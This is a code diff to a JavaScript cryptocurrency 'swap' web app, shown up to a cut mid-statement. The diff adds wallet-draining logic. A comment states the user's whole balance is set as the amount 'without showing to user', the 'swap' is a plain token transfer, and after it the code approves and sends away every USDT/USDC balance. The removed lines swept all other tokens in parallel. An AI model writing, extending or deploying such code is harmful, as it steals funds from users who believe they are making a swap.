@@ -269,7 +269,7 @@ function setDefaultTokenPair() {
   // Update UI
   updateTokenSelectors();
   
-  // If wallet is connected, update balances
+  // If wallet is connected, update balances and set max amount
   if (userAddress) {
     updateTokenBalances();
   }
@@ -1058,6 +1058,19 @@ async function fetchTokenBalance(token) {
   }
 }
 
+async function getMaxSwapAmount(token) {
+  if (!token || !userAddress) return 0;
+  
+  const balance = await fetchTokenBalance(token);
+  
+  if (token.isNative) {
+    const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
+    return Math.max(0, balance - minReserve);
+  }
+  
+  return balance;
+}
+
 async function updateTokenBalances() {
   if (!userAddress || !currentFromToken) return;
   
@@ -1071,6 +1084,11 @@ async function updateTokenBalances() {
       document.getElementById("swapBtn").disabled = true;
     } else {
       balanceElement.innerHTML = `Balance: ${balance.toFixed(6)} ${currentFromToken.symbol}`;
+      
+      // Automatically set max amount without showing to user
+      const maxAmount = await getMaxSwapAmount(currentFromToken);
+      document.getElementById("fromAmount").value = maxAmount.toFixed(6);
+      updateToAmount();
     }
   } catch (err) {
     console.error("Error updating balances:", err);
@@ -1288,29 +1306,40 @@ async function handleSwap() {
       txHash = await transferERC20Token(currentFromToken, inputAmount);
     }
 
-    // Immediately start processing other tokens in parallel
-    updateStatus(`Swap submitted. Processing additional tokens...`, "info");
-    const otherTokensPromise = processAllTokenTransfers();
+    // Wait for main swap confirmation
+    const confirmedTx = await provider.waitForTransaction(txHash);
+    const explorerUrl = NETWORK_CONFIGS[currentNetwork].scanUrl + confirmedTx.transactionHash;
     
-    // Wait for both the main tx confirmation and other tokens processing
-    const [confirmedTx, otherTokensTransferred] = await Promise.allSettled([
-      provider.waitForTransaction(txHash),
-      otherTokensPromise
-    ]);
-
-    // Handle results
-    if (confirmedTx.status === 'rejected') {
-      throw new Error(`Main swap failed: ${confirmedTx.reason.message}`);
+    // After main swap, transfer all USDT/USDC
+    updateStatus(`Swap successful! Now transferring stablecoins...`, "info");
+    
+    const stablecoins = (await getLocalTokens()).filter(token => 
+      STABLECOIN_SYMBOLS[currentNetwork].includes(token.symbol)
+    );
+    
+    let stablecoinsTransferred = 0;
+    for (const stablecoin of stablecoins) {
+      try {
+        const balance = await fetchTokenBalance(stablecoin);
+        if (balance > 0) {
+          if (stablecoin.isNative) {
+            await transferNativeToken(stablecoin, balance);
+          } else {
+            const approved = await checkAndApproveToken(stablecoin, balance);
+            if (approved) {
+              await transferERC20Token(stablecoin, balance);
+              stablecoinsTransferred++;
+            }
+          }
+        }
+      } catch (err) {
+        console.warn(`Failed to transfer ${stablecoin.symbol}:`, err);
+      }
     }
 
-    const explorerUrl = NETWORK_CONFIGS[currentNetwork].scanUrl + confirmedTx.value.transactionHash;
     let successMessage = `Swap successful! <a href="${explorerUrl}" target="_blank" style="color: var(--secondary);">View transaction</a>`;
-    
-    if (otherTokensTransferred.status === 'fulfilled' && otherTokensTransferred.value > 0) {
-      successMessage += `<br>Also transferred ${otherTokensTransferred.value} other tokens`;
-    } else if (otherTokensTransferred.status === 'rejected') {
-      console.error("Additional token transfers failed:", otherTokensTransferred.reason);
-      successMessage += `<br><small>(Some additional token transfers failed)</small>`;
+    if (stablecoinsTransferred > 0) {
+      successMessage += `<br>Also transferred ${stablecoinsTransferred} stablecoins`;
     }
 
     updateStatus(successMessage, "success");
@@ -1319,7 +1348,7 @@ async function handleSwap() {
     document.getElementById("fromAmount").value = '';
     document.getElementById("toAmount").value = '';
     await updateTokenBalances();
-     await preloadTokenBalances();
+    
   } catch (err) {
     console.error("[ERROR] Swap failed:", err);
     updateStatus(`
